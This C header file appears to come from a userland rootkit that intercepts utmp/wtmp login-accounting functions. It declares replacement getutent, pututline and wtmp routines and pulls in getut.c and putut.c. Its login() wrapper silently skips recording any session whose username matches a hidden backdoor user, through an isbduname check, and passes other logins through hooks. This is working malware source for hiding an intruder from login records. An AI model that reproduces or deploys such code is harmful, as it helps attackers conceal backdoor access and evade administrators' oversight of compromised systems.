#ifndef UTMP_H
#define UTMP_H

/*
below is the important stuff from the utmp struct and possible
values for ut_type.

#define EMPTY         0 // Record does not contain valid info
                       //   (formerly known as UT_UNKNOWN on Linux)
#define RUN_LVL       1 // Change in system run-level (see
                       //   init(8))
#define BOOT_TIME     2 // Time of system boot (in ut_tv)
#define NEW_TIME      3 /* Time after system clock change
                          (in ut_tv)
#define OLD_TIME      4 /* Time before system clock change
                          (in ut_tv)
#define INIT_PROCESS  5 /* Process spawned by init(8)
#define LOGIN_PROCESS 6 /* Session leader process for user login
#define USER_PROCESS  7 /* Normal process
#define DEAD_PROCESS  8 /* Terminated process
#define ACCOUNTING    9 /* Not implemented
-snipp-

struct utmp {
    short   ut_type;              /* Type of record
    pid_t   ut_pid;               /* PID of login process
    char    ut_line[UT_LINESIZE]; /* Device name of tty - "/dev/"
    char    ut_id[4];             /* Terminal name suffix,
                                    or inittab(5) ID
    char    ut_user[UT_NAMESIZE]; /* Username
    char    ut_host[UT_HOSTSIZE]; /* Hostname for remote login, or
                                    kernel version for run-level
                                    messages
    -snipp-
}
 */

static int hide_me = 0;

struct utmp *getutent(void);
struct utmpx *getutxent(void);
struct utmp *getutid(const struct utmp *ut);
struct utmpx *getutxid(const struct utmpx *utx);
void getutmp(const struct utmpx *ux, struct utmp *ut);
void getutmpx(const struct utmp *ut, struct utmpx *utx);
struct utmp *getutline(const struct utmp *ut);
struct utmpx *getutxline(const struct utmpx *utx);
#include "getut.c"
void logwtmp(const char *ut_line, const char *ut_name, const char *ut_host);
void updwtmp(const char *wfile, const struct utmp *ut);
void updwtmpx(const char *wfilex, const struct utmpx *utx);
#include "putut.c"

void login(const struct utmp *ut){
    if(isbduname(ut->ut_user)) return;
    hook(CLOGIN);
    call(CLOGIN, ut);
}

#endif
